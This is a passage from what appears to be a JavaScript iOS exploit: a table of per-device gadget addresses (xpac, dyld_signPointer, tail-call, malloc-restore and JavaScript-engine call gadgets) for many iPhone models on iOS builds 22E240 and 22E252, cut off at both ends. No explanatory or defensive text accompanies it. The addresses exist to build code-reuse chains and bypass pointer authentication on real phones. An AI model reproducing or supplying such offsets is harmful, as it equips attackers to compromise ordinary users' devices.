      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff38970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,2_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda5f24n,
      tcall_RLG: 0x20db52218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261ee098cn,
      fcall_14_args_write_x8: 0x24c76cf7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff38970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,3_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb0d2ecn,
      tcall_X0LG: 0x21eda1f24n,
      tcall_RLG: 0x20db4e218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261b3198cn,
      fcall_14_args_write_x8: 0x24c768f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aafd4n,
      transformSurface_gadget: 0x20ff34970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,4_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb0d2ecn,
      tcall_X0LG: 0x21eda1f24n,
      tcall_RLG: 0x20db4e218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261b3198cn,
      fcall_14_args_write_x8: 0x24c768f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aafd4n,
      transformSurface_gadget: 0x20ff34970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,5_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb052ecn,
      tcall_X0LG: 0x21ed99f24n,
      tcall_RLG: 0x20db46218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x26189b98cn,
      fcall_14_args_write_x8: 0x24c760f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7a2fd4n,
      transformSurface_gadget: 0x20ff2c970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone11,2_4_6_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ecf72ecn,
      tcall_X0LG: 0x21ed72f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260f0198cn,
      fcall_14_args_write_x8: 0x24c44cf7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a994fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone11,8_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ecbf2ecn,
      tcall_X0LG: 0x21ed6ef24n,
      tcall_RLG: 0x20db2e218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260ef098cn,
      fcall_14_args_write_x8: 0x24c414f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a95cfd4n,
      transformSurface_gadget: 0x20ff14970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone12,1_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ecc32ecn,
      tcall_X0LG: 0x21ed72f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260fe298cn,
      fcall_14_args_write_x8: 0x24c460f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a960fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone12,3_5_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ecc32ecn,
      tcall_X0LG: 0x21ed72f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260fe298cn,
      fcall_14_args_write_x8: 0x24c460f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a960fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone12,8_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ebdb2ecn,
      tcall_X0LG: 0x21ed6ef24n,
      tcall_RLG: 0x20db2e218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260f2198cn,
      fcall_14_args_write_x8: 0x24c370f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a878fd4n,
      transformSurface_gadget: 0x20ff14970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone13,1_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eae52ecn,
      tcall_X0LG: 0x21ed85f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26127d98cn,
      fcall_14_args_write_x8: 0x24c633f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a782fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone13,2_3_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eae92ecn,
      tcall_X0LG: 0x21ed89f24n,
      tcall_RLG: 0x20db36218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26161e98cn,
      fcall_14_args_write_x8: 0x24c637f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a786fd4n,
      transformSurface_gadget: 0x20ff1c970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone13,4_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eae92ecn,
      tcall_X0LG: 0x21ed89f24n,
      tcall_RLG: 0x20db36218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26161e98cn,
      fcall_14_args_write_x8: 0x24c637f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a786fd4n,
      transformSurface_gadget: 0x20ff1c970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone14,2_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eabd2ecn,
      tcall_X0LG: 0x21ed8df24n,
      tcall_RLG: 0x20db3a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x2619ec98cn,
      fcall_14_args_write_x8: 0x24c683f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a75afd4n,
      transformSurface_gadget: 0x20ff20970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone14,3_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eabd2ecn,
      tcall_X0LG: 0x21ed8df24n,
      tcall_RLG: 0x20db3a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x2619ec98cn,
      fcall_14_args_write_x8: 0x24c683f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a75afd4n,
      transformSurface_gadget: 0x20ff20970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone14,4_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eab52ecn,
      tcall_X0LG: 0x21ed85f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26164398cn,
      fcall_14_args_write_x8: 0x24c67bf7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a752fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone14,5_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eab52ecn,
      tcall_X0LG: 0x21ed85f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26164398cn,
      fcall_14_args_write_x8: 0x24c67bf7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a752fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone14,6_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ea312ecn,
      tcall_X0LG: 0x21ed89f24n,
      tcall_RLG: 0x20db36218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x2615f298cn,
      fcall_14_args_write_x8: 0x24c5eff7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a6cefd4n,
      transformSurface_gadget: 0x20ff1c970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone14,7_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eacd2ecn,
      tcall_X0LG: 0x21ed9df24n,
      tcall_RLG: 0x20db4a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261a0398cn,
      fcall_14_args_write_x8: 0x24c693f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a76afd4n,
      transformSurface_gadget: 0x20ff30970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone14,8_22E252": {
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eacd2ecn,
      tcall_X0LG: 0x21ed9df24n,
      tcall_RLG: 0x20db4a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261a0398cn,
      fcall_14_args_write_x8: 0x24c693f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a76afd4n,
      transformSurface_gadget: 0x20ff30970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone15,2_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb0d2ecn,
      tcall_X0LG: 0x21ed9df24n,
      tcall_RLG: 0x20db4a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261df898cn,
      fcall_14_args_write_x8: 0x24c6d4f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aafd4n,
      transformSurface_gadget: 0x20ff30970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone15,3_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb0d2ecn,
      tcall_X0LG: 0x21ed9df24n,
      tcall_RLG: 0x20db4a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261df898cn,
      fcall_14_args_write_x8: 0x24c6d4f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aafd4n,
      transformSurface_gadget: 0x20ff30970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone15,4_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda1f24n,
      tcall_RLG: 0x20db4e218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261a9d98cn,
      fcall_14_args_write_x8: 0x24c6d8f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff34970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone15,5_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda1f24n,
      tcall_RLG: 0x20db4e218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261a9d98cn,
      fcall_14_args_write_x8: 0x24c6d8f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff34970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone16,1_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda5f24n,
      tcall_RLG: 0x20db52218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x2625fc98cn,
      fcall_14_args_write_x8: 0x24ce88f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff38970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone16,2_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda5f24n,
      tcall_RLG: 0x20db52218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x2625fc98cn,
      fcall_14_args_write_x8: 0x24ce88f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff38970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,1_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda5f24n,
      tcall_RLG: 0x20db52218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
